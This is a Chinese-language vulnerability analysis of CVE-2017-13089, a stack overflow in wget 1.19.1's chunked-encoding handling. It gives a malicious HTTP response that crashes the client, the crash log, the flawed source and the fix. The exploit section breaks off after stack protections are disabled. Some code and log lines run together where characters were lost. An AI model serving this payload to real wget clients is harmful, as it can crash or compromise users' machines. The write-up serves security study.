作者：[Firmy@青藤实验室](https://mp.weixin.qq.com/s/KW9ROTCMJyJ-mBt8dwBmBg
"Firmy@青藤实验室")
#### 0x00 应用简介
wget 是一个从网络上自动下载文件的工具，支持通过 HTTP、HTTPS、FTP 三种最常见的 TCP/IP 协议。
#### 0x01 漏洞描述
在处理例如重定向的情况时，wget 会调用到 `skip_short_body()` 函数，函数中会对分块编码的数据调用 `strtol()`
函数读取每个块的长度，但在版本 1.19.2 之前，没有对这个长度进行必要的检查，例如其是否为负数。然后 wget 通过使用 `MIN()` 宏跳过块的
512 个字节，将负数传递给了函数 `fd_read()`。由于 `fd_read()` 接收的参数类型为 int，所以块长度的高 32
位会被丢弃，使得攻击者可以控制传递给 `fd_read()` 的参数。
#### 0x02 漏洞复现
首先编译安装 wget-1.19.1：
    $ sudo apt-get install libneon27-gnutls-dev
    $ wget https://ftp.gnu.org/gnu/wget/wget-1.19.1.tar.gz
    $ tar zxvf wget-1.19.1.tar.gz
    $ cd wget-1.19.1
    $ ./configure
    $ make && sudo make install
    $ wget -V | head -n1
    GNU Wget 1.19.1 built on linux-gnu.
引发崩溃的 payload 如下：
    HTTP/1.1 401 Not Authorized
    Content-Type: text/plain; charset=UTF-8
    Transfer-Encoding: chunked
    Connection: keep-alive
    -0xFFFFFD00

    0
stack smashing 现场：
    $ nc -lp 6666  'index.html' (UTF-8)
    --2018-01-30 11:42:32-- http://localhost:6666/
    Resolving localhost... 127.0.0.1
    Caching localhost => 127.0.0.1
    Connecting to localhost|127.0.0.1|:6666... connected.
    Created socket 4.
    Releasing 0x00000000012f51b0 (new refcount 1).
    ---request begin---    GET / HTTP/1.1
    User-Agent: Wget/1.19.1 (linux-gnu)
    Accept: */*
    Accept-Encoding: identity
    Host: localhost:6666
    Connection: Keep-Alive
    ---request end---    GET / HTTP/1.1
    User-Agent: Wget/1.19.1 (linux-gnu)
    Accept: */*
    Accept-Encoding: identity
    Host: localhost:6666
    Connection: Keep-Alive
    HTTP request sent, awaiting response...
    ---response begin---    HTTP/1.1 401 Not Authorized
    Content-Type: text/plain; charset=UTF-8
    Transfer-Encoding: chunked
    Connection: keep-alive
    ---response end---    401 Not Authorized
    Registered socket 4 for persistent reuse.
    Skipping -4294966528 bytes of body:
kipping -4294967296
    bytes of body: [] aborting (EOF received).
    *** stack smashing detected ***: wget terminated
    [1]+ Done  nc -lp 6666  SKIP_THRESHOLD)
        return false;
      while (contlen > 0 || chunked)
        {
          int ret;
          if (chunked)
            {
              if (remaining_chunk_size == 0)
                {
                  char *line = fd_read_line (fd);
                  char *endl;
                  if (line == NULL)
                    break;
                  remaining_chunk_size = strtol (line, &endl, 16);  // 未检查remaining_chunk_size是否为负
                  xfree (line);
                  if (remaining_chunk_size == 0)
                    {
                      line = fd_read_line (fd);
                      xfree (line);
                      break;
                    }
                }
              contlen = MIN (remaining_chunk_size, SKIP_SIZE);  // contlen 为可控变量
            }
          DEBUGP (("Skipping %s bytes of body: [", number_to_static_string (contlen)));
          ret = fd_read (fd, dlbuf, MIN (contlen, SKIP_SIZE), -1);  // 引发溢出
          if (ret imp->reader)
        return info->imp->reader (fd, buf, bufsize, info->ctx);
      else
        return sock_read (fd, buf, bufsize);
    }
补丁
    git show d892291fb8ace4c3b734ea5125770989c215df3f | cat
    commit d892291fb8ace4c3b734ea5125770989c215df3f
    Author: Tim RühsenDate:   Fri Oct 20 10:59:38 2017 +0200
        Fix stack overflow in HTTP protocol handling (CVE-2017-13089)
        * src/http.c (skip_short_body): Return error on negative chunk size
        Reported-by: Antti Levom?ki, Christian Jalio, Joonas Pihlaja from Forcepoint
        Reported-by: Juhani Eronen from Finnish National Cyber Security Centre
    diff --git a/src/http.c b/src/http.c
    index 5536768..dc31823 100644
    --- a/src/http.c
    +++ b/src/http.c
    @@ -973,6 +973,9 @@ skip_short_body (int fd, wgint contlen, bool chunked)
                   remaining_chunk_size = strtol (line, &endl, 16);
                   xfree (line);
    +              if (remaining_chunk_size < 0)
    +                return false;
    +
                   if (remaining_chunk_size == 0)
                     {
                       line = fd_read_line (fd);
补丁也很简单，就是对 `remaining_chunk_size` 是否为负值进行了判断。
#### 0x04 Exploit
在这里我们做一点有趣的事情。先修改一下配置文件 configure.ac，把堆栈保护技术都关掉，也就是加上下面所示的这几行：
    $ cat configure.ac | grep -A4 stack
    dnl Disable stack canaries
    CFLAGS="-fno-stack-protector $CFLAGS"
    dnl Disable No-eXecute
    CFLAGS="-z execstack $CFLAGS"
    dnl
    dnl Create output
    dnl
然后编译安装，结果如下：
    $ sudo apt-get install automake
    $ make && sudo make install
    $ pwn checksec /usr/local/bin/wget 
    [*] '/usr/local/bin/wget'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX disabled